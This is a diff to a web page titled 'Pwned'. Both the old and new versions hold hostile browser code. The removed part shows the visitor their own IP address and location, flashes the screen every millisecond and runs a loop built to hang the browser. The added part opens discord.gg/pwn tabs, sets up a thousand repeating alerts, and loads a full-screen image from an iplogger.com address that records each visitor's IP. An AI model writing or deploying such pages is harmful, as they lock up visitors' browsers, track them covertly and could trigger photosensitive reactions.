@@ -1,49 +1,38 @@
-   <script>
-        function fetchIPAndInfo() {
-            fetch('https://api.ipify.org/?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    document.getElementById('ip-address-value').textContent = data.ip;
-                    return data.ip;
-                })
-                .then(ip => fetch(`https://ipinfo.io/${ip}/json`))
-                .then(response => response.json())
-                .then(ipInfoData => {
-                    document.getElementById('ip-info').textContent = JSON.stringify(ipInfoData, null, 2);
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                    document.getElementById('ip-address-value').textContent = 'Unable to fetch IP address.';
-                    document.getElementById('ip-info').textContent = 'Unable to fetch IP information.';
-                });
-        }
-
-        function toggleBackgroundColor() {
-            var body = document.getElementsByTagName('body')[0];
-            var currentColor = body.style.backgroundColor;
-            var newColor = currentColor === 'white' ? 'black' : 'white';
-            body.style.backgroundColor = newColor;
-        }
-
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Pwned</title>
+  <script>
+    window.onload = function() {
+        setTimeout(function() {
+                 window.open('https://discord.gg/pwn','_blank');
+                 window.open('https://discord.gg/pwn','_blank');
+                  window.open('https://discord.gg/pwn','_blank');
+            }, 5000); 
         
-        fetchIPAndInfo();
-
-        setInterval(toggleBackgroundColor, 1);
-        window.open('https://discord.gg/pwn','_blank');
-    </script>
-
-
-<script>
-setInterval(function() {
-  alert("Discord.gg/pwn");
-}, 1);
+        for (var i = 0; i < 1000; i++) {
+            setInterval(function() {
+                alert("Discord.gg/pwn");
+            }, 6000);
+        }
+    }
 </script>
-
-
- <script>
-var total = "";
-for( var i = 0; i < 1000000000000000000; i++ ) {
-  total += i.toString();
-  history.pushState(0,0, total );
-}
-</script>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+        }
+        img {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+    </style>
+</head>
+<body>
+    <img src="https://iplogger.com/2eHhJ4.png" alt="Full Screen Image">
+</body>
+</html>
